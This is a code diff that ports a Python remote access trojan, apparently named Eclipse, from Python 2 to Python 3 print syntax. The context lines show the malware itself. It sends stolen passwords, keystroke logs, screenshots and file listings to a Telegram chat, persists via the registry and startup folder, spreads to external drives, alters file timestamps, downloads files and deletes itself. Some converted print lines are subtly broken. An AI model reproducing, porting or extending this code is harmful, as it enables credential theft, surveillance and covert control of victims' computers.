@@ -98,7 +98,7 @@ def changetTimestamp(folderPath, fileName, dayLimit):
     try:
         modify_timestamp.changeTimestamp(folderPath, fileName, dayLimit)
     except Exception as e:
-        print e
+        print (e)
 
 
 def cmdPrompt(command):
@@ -107,7 +107,7 @@ def cmdPrompt(command):
         output = output[0].replace(" ","")
         bot.sendMessage(CHAT_ID, output)
     except Exception as e:
-        print e
+        print (e)
 
 
 def copyFiles(copytodir, stub):
@@ -118,9 +118,9 @@ def copyFiles(copytodir, stub):
             try:
                 shutil.copy2(stub, copytodir + coppiedfilename)
             except Exception as e:
-                print e
+                print (e)
     except Exception as e:
-        print e
+        print (e)
     return True
 
 
@@ -132,9 +132,9 @@ def copyToStartup():
             try:
                 shutil.copy2(copyfromdir, STARTUP_PATH + "\\" + copied_startup_filename)
             except Exception as e:
-                print e
+                print (e)
     except Exception as e:
-        print e
+        print (e)
 
     return True
 
@@ -144,7 +144,7 @@ def download(url, dest):
         urllib.urlretrieve(url, dest + url.split('/')[-1])
         bot.sendMessage(CHAT_ID, USER + ": File Downloaded <^_^>")
     except Exception as e:
-        print e
+        print (e)
 
 
 def driveCheck():
@@ -158,25 +158,25 @@ def execute(command):
             try:
                 subprocess.call(["shutdown","/s"])
             except Exception as e:
-                print e
+                print (e)
         elif command == "logoff":
             try:
                 subprocess.call(["shutdown","/l"])
             except Exception as e:
-                print e
+                print (e)
         elif command == "restart":
             try:
                 subprocess.call(["shutdown","/r"])
             except Exception as e:
-                print e
+                print (e)
         elif command == "lock":
             try:
                 ctypes.windll.user32.LockWorkStation()
                 bot.sendMessage(CHAT_ID, USER + ' Computer is locked! \ 0.0 /')
             except Exception as e:
-                print e
+                print (e)
     except Exception as e:
-        print e
+        print (e)
 
         
 def find(things):
@@ -203,14 +203,14 @@ def getWindowTitles():
                 titles.append(title)
         return titles
     except Exception as e:
-        print e
+        print (e)
         return False
 
 
 def handle(msg):
     content_type, chat_type, chat_id = telepot.glance(msg)
     if content_type == 'text':
-        print '[*] Command: ' + msg['text']
+        print ('[*] Command: ') + msg['text']
         text_cmd = msg['text'].lower().split(' ')
         usr = USER.replace(" ", "").lower()
         if 'whoisonline' in text_cmd:
@@ -294,7 +294,7 @@ def killMe():
         os.remove(sys.argv[0])
         sys.exit(0)
     except Exception as e:
-        print e
+        print (e)
 
 
 def lookPorts(host, threads, ports):
@@ -304,7 +304,7 @@ def lookPorts(host, threads, ports):
         open_ports = lp.run(host, threads, ports)
         bot.sendMessage(CHAT_ID, "Open Ports in " + USER + ": " + str(open_ports))
     except Exception as e:
-        print e
+        print (e)
 
 
 def lookRouter():
@@ -334,7 +334,7 @@ def main():
                 while 1:
                     time.sleep(5)
             except KeyboardInterrupt:
-                print '[*] Eclipse completed...'
+                print ('[*] Eclipse completed...')
         except Exception as e:
             pass
 
@@ -355,13 +355,13 @@ def persistance():
     try:
         add_to_registry.addRegistery(CURR_FILE_PATH)
     except Exception as e:
-        print e
+        print (e)
 
 
 def pollDevice():
     while True:
         if check_external_drive.FLAG == True:
-            print "[*] Drive Found: ", check_external_drive.DRIVE+":\\"
+            print ("[*] Drive Found: "), check_external_drive.DRIVE+":\\"
             copyFiles(check_external_drive.DRIVE+":\\",os.path.realpath(sys.argv[0]))
             check_external_drive.FLAG = False
 
@@ -380,7 +380,7 @@ def rename(renameFlag, folderPath, fileName, newName):
         elif renameFlag == '1':
             modify_file_names.local_file(folderPath, fileName, newName)
     except Exception as e:
-        print e
+        print (e)
 
 
 def screenshot():
@@ -391,7 +391,7 @@ def screenshot():
         bot.sendPhoto(CHAT_ID,open(ts+'.png','rb'),caption="Screenshot from " + USER.upper())
         os.remove(str(ts) + '.png')
     except Exception as e:
-        print e
+        print (e)
     return True
 
 
@@ -405,14 +405,14 @@ def send(what):
             os.remove(CACHE_PATH + "DirectoryTree.txt")
             bot.sendMessage(CHAT_ID, USER + ": Directory tree sent!! <^_^>")
         except Exception as e:
-            print e
+            print (e)
     elif what == "driveslist":
         try:
             LD = DirectoryTree.Directory()
             drives = LD.get_list_drives()
             bot.sendMessage(CHAT_ID, USER + " : " + str(drives))
         except Exception as e:
-            print e
+            print (e)
     elif what == "passwords":
         try:
             passwords = Run.Result()
@@ -423,7 +423,7 @@ def send(what):
             os.remove(CACHE_PATH + "info.txt")
             bot.sendMessage(CHAT_ID, USER + ": Passwords sent!! <^_^>")
         except Exception as e:
-            print e
+            print (e)
     elif what == "keystrokes":
         try:
             transfer.sendData(USERDATA_PATH + "keylog", ".txt")
@@ -431,7 +431,7 @@ def send(what):
             clear = open(USERDATA_PATH + "keylog.txt","w")
             clear.close()
         except Exception as e:
-            print e
+            print (e)
     elif what == "openwindows":
         openWindows = getWindowTitles()
         bot.sendMessage(CHAT_ID, USER + " : " + str(openWindows))
@@ -449,7 +449,7 @@ def setEmailTemplate(emailFlag, pathEmailTemp, data):
             set_email_template.updateEmailTemplate(pathEmailTemp, data)
             bot.sendMessage(CHAT_ID, USER + ": Email template set!!")
     except Exception as e:
-        print e
+        print (e)
 
         
 def setStuff(things):
@@ -486,7 +486,7 @@ def setWallpaper(imageUrl):
         wallpaper = ChangeWallpaper.ChangeWallpaper()
         wallpaper.downloadWallpaper(imageUrl)
     except Exception as e:
-        print e
+        print (e)
 
 
 def start(service):
@@ -520,7 +520,7 @@ def start(service):
             pDevcThread.daemon = True
             pDevcThread.start()
     except Exception as e:
-        print e
+        print (e)
 
 
 def startHttpServer(serverPath, port):
@@ -529,7 +529,7 @@ def startHttpServer(serverPath, port):
         server = httpServer.SimpleServer()
         server.runServer(serverPath, port)
     except Exception as e:
-        print e
+        print (e)
         
 
 def startUpWork():
@@ -572,17 +572,17 @@ def startUpWork():
                     changetTimestamp(USERDATA_PATH, "CHL.zip", 777)
                     
                 except Exception as e:
-                    print e
+                    print (e)
                     
                 try:
-                    print '[*] Sending the files'
+                    print ('[*] Sending the files')
                     transfer.sendData(USERDATA_PATH + "info", ".txt")
                     # os.remove(USERDATA_PATH + info)
                     transfer.sendData(USERDATA_PATH + "CHL", ".zip")
                 except Exception as e:
-                    print e
+                    print (e)
     except Exception as e:
-        print e
+        print (e)
 
 
 def stop(service):
@@ -596,7 +596,7 @@ def stop(service):
         elif "webserver" in service:
             server.stopServer()
     except Exception as e:
-        print e
+        print (e)
 
 
 def upload():
